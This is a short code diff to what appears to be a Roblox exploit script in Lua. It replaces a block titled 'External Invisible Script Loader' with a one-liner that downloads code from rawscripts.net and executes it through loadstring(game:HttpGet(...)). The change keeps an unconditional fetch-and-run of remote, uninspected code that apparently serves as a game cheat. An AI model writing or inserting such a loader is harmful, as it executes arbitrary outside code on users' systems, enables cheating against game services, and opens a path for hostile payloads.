@@ -547,17 +547,4 @@ end)
 
 -- -----------------------------
 -- External Invisible Script Loader
-
--- 🔗 Auto-run external script on execute
-task.spawn(function()
-    local ExternalScriptURL = "https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"
-    local success, response = pcall(function()
-        return game:HttpGet(ExternalScriptURL)
-    end)
-
-    if success and response then
-        loadstring(response)()
-    else
-        warn("⚠️ Failed to load external script: " .. tostring(response))
-    end
-end)
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-script-20557"))()
